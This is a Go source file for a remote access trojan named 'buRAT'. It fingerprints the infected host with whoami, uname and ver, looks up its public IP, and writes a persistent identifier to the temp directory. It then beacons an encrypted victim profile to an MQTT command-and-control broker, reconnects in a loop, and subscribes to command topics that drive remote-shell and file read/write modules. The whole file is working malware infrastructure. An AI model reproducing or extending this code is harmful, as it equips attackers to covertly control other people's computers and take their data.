package burat

import(
  "../internals"
  "../bushido"

  "github.com/eclipse/paho.mqtt.golang"

  "crypto/rand"
  "encoding/base64"
  "encoding/hex"
  "fmt"
  "io/ioutil"
  "runtime"
  "net/http"
  "os"
  "os/exec"
  "strings"
  "time"
)

type _profile struct {
  Id              string  `msgpack:"id"`
  Host            string  `msgpack:"host"`
  Os              string  `msgpack:"os"`
  Ip              string  `msgpack:"ip"`
  Status          string  `msgpack:"status"`
  Aes             _aes    `msgpack:"aes"`
}

type _aes struct {
  Key   []byte  `msgpack:"key"`
  Iv    []byte  `msgpack:"iv"`
}

type _internals struct {
  Mqtt            mqtt.Client
  Serialization   internals.Serialization
  RSA             internals.RSA
  AES             internals.AES
  Digest          internals.Digest
}

type _bushido struct {
  RemoteShell     bushido.BuRemoteShell
  FileRW          bushido.BuFileRW
}

type buRAT struct {
  id              string
  host            string
  os              string
  ip              string
  status          string
  _internals       _internals
  _bushido         _bushido
  _cmdTopics      map[string]func (client mqtt.Client, msg mqtt.Message)
  _topics         map[string]string
  _isConnecting   bool
}

type BuRAT interface {
  Id()
  Host()
  Os()
  Ip()
  Status()
  Internals()
  Bushido()
  Profile() string
  Seen(packet interface{}) []byte
  Decryse(data []byte, packet interface{})
  AddTopicCallback(topic string, block func (client mqtt.Client, msg mqtt.Message))
  Publish(id string, topic string, qos byte, retain bool, payload []byte)
  AddTopics()
  Connect()
  Connecting() bool
  Ping()
}

func NewBuRAT() *buRAT {
  b := &buRAT {
    id: _id(),
    host: _host(),
    os: _os(),
    ip: "unknown",
    status: "offline",
    _internals: _internals {
      Mqtt:           mqtt.NewClient(mqtt.NewClientOptions()),
      Serialization:  internals.NewSerialization(),
      RSA:            internals.NewRSA(),
      AES:            internals.NewAES(),
      Digest:         internals.NewDigest(),
    },
    _bushido: _bushido {
      RemoteShell:    bushido.NewBuRemoteShell(),
      FileRW:         bushido.NewBuFileRW(),
    },
    _cmdTopics: make(map[string]func (client mqtt.Client, msg mqtt.Message)),
    _topics: make(map[string]string),
    _isConnecting: false,
  }
  return b
}

func (b *buRAT) Id() string { return b.id }
func (b *buRAT) Host() string { return b.host }
func (b *buRAT) Os() string { return b.os }
func (b *buRAT) Ip() string { return b.ip }
func (b *buRAT) Status() string { return b.status }
func (b *buRAT) Internals() _internals { return b._internals }
func (b *buRAT) Bushido() _bushido { return b._bushido }

func (b *buRAT) Profile() string {
  profile := _profile {
    Id: b.id,
    Host: b.host,
    Os: b.os,
    Ip: _ip(),
    Status: b.status,
    Aes: _aes {
      Key: b._internals.AES.Key(),
      Iv: b._internals.AES.Iv(),
    },
  }
  p := b._internals.Serialization.Serialize(profile)
  p = b._internals.RSA.Encrypt(p)
  s := base64.StdEncoding.EncodeToString(p)
  return s
}

func (b *buRAT) Seen(packet interface{}) []byte {
  data := b._internals.Serialization.Serialize(packet)
  data = b._internals.AES.Encrypt(data)
  return data
}

func (b *buRAT) Decryse(data []byte, packet interface{}) {
  data = b._internals.AES.Decrypt(data)
  b._internals.Serialization.Deserialize(data, packet)
}

func (b *buRAT) AddTopicCallback(topic string, block func (client mqtt.Client, msg mqtt.Message)) {
  topic = b._topics[topic]
  b._cmdTopics[topic] = block
}

func (b *buRAT) Publish(id string, topic string, qos byte, retain bool, payload []byte) {
  topic = b._topics[topic]
  topic = strings.Replace(topic, "+", b._internals.Digest.Digest(id), -1)
  b._internals.Mqtt.Publish(topic, qos, retain, payload)
}

func (b *buRAT) AddTopics(topics map[string]string) {
  for k, v := range topics {
    if strings.Contains(v, "BURAT") {
      v = strings.Replace(v, "BURAT", b.id, -1)
      topics[k] = v
    }
    topics[k] = b.digestTopic(v)
  }
  b._topics = topics
}

func (b *buRAT) Connect() {
  b.status = "offline"
  b._isConnecting = true
  go b.connect()
}

func (b *buRAT) Connecting() bool {
  return b._isConnecting
}

func (b *buRAT) Ping() {
  b._internals.Mqtt.Publish(b._topics["nil"], 2, false, nil)
}

func (b *buRAT) digestTopic(topic string) string {
  levels := strings.Split(topic, "/")
  for i, l := range levels {
    if l != "+" && l != "#" {
      levels[i] = b._internals.Digest.Digest(l)
    }
  }
  topic = strings.Join(levels, "/")
  return topic
}

func _id() string {
  var id string

  filePath := os.TempDir() + "/bushi"

  if _, err := os.Stat(filePath); os.IsNotExist(err) {
    id, _ = randomHex(2)
    data := []byte(id)
    file, err := os.OpenFile(filePath, os.O_RDWR|os.O_CREATE, 0755)
    if err != nil { fmt.Println(err) }
  	_, err = file.WriteAt(data, 0)
  	if err := file.Close(); err != nil { fmt.Println(err) }
  } else {
    data := make([]byte, 4)
  	file, err := os.OpenFile(filePath, os.O_RDWR|os.O_CREATE, 0755)
    if err != nil { fmt.Println(err) }
  	file.ReadAt(data, 0)
    if err := file.Close(); err != nil { fmt.Println(err) }
    id = string(data)
  }

  return id
}

func _host() string {
  switch os := runtime.GOOS; os {
	case "linux":
    nodename, _ := exec.Command("uname", "-n").Output()
    user, _ := exec.Command("whoami").Output()
    host := strings.TrimSpace(string(nodename)) + "\\" + strings.TrimSpace(string(user))
    return host
  case "windows":
    host, _ := exec.Command("whoami").Output()
    return strings.TrimSpace(string(host))
	default:
		return ""
	}
}

func _os() string {
  switch os := runtime.GOOS; os {
	case "linux":
    os, _ := exec.Command("uname", "-sr").Output()
    return strings.TrimSpace(string(os))
  case "windows":
    os, _ := exec.Command("cmd", "/c", "ver").Output()
    return strings.TrimSpace(string(os))
	default:
		return os
	}
}

func _ip() string {
  resp, err := http.Get("http://whatismyip.akamai.com")
  if err != nil { panic(err) }
  defer resp.Body.Close()
  ip, err := ioutil.ReadAll(resp.Body)
  if err != nil { panic(err) }
  return string(ip)
}

func (b *buRAT) initMqtt() {
  opts := mqtt.NewClientOptions()
  opts.AddBroker("tcp://localhost:1883")
  opts.SetOnConnectHandler(func (client mqtt.Client) {
    b.status = "online"
    client.Publish(b._topics["bushi"], 2, true, b.Profile())
  })
  opts.SetWill(b._topics["bushi"], b.Profile(), 2, true)
  b._internals.Mqtt = mqtt.NewClient(opts)
}

func (b *buRAT) connect() {
  defer func() {
    if r := recover(); r != nil {
        fmt.Println(r)
        time.Sleep(11 * time.Second)
        b.Connect()
    }
  }()
  b.initMqtt()
  if token := b._internals.Mqtt.Connect(); token.Wait() && token.Error() != nil {
		fmt.Println(token.Error())
    time.Sleep(11 * time.Second)
    b.Connect()
	} else {
    b._isConnecting = false
    for k, v := range b._cmdTopics {
      b._internals.Mqtt.Subscribe(k, 2, v)
    }
  }
}

func randomHex(n int) (string, error) {
  bytes := make([]byte, n)
  if _, err := rand.Read(bytes); err != nil {
    return "", err
  }
  return hex.EncodeToString(bytes), nil
}
